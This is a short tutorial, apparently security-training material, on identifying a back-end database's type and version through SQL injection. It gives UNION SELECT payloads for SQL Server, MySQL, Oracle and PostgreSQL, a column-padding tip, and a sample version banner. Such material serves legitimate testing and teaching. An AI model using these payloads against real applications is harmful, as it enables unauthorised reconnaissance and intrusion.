# Querying the database type and version

Different database engines store and expose their software version details using distinct built-in functions, system variables, or metadata views. You can fingerprint the exact database management system (DBMS) and version by injecting provider-specific version queries into a `UNION SELECT` payload and observing which one executes without an error.

## Version Queries by Database Type


| Database Type | Version Query | Example `UNION` Payload (Single String Column) |
| --- | --- | --- |
| Microsoft SQL Server | `SELECT @@version` | `' UNION SELECT @@version--` |
| MySQL | `SELECT @@version` | `' UNION SELECT @@version#` (or `--` ) |
| Oracle | `SELECT * FROM v$version` | `' UNION SELECT banner FROM v$version--` |
| PostgreSQL | `SELECT version()` | `' UNION SELECT version()--` |

> Match the number of columns in your `UNION SELECT` payload to the original query by padding remaining positions with `NULL`, such as `' UNION SELECT NULL, @@version--`.

## Example Attack and Output

Assuming the original query returns a single string-compatible column, you can test whether the back-end database is Microsoft SQL Server or MySQL by submitting:

```
' UNION SELECT @@version--
```

If the query succeeds, the application renders the database's version banner directly in the HTTP response:

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

This output confirms both the exact DBMS (**Microsoft SQL Server 2016**) and the underlying operating system (**Windows Server 2016**), allowing you to tailor all subsequent enumeration payloads to that specific syntax.
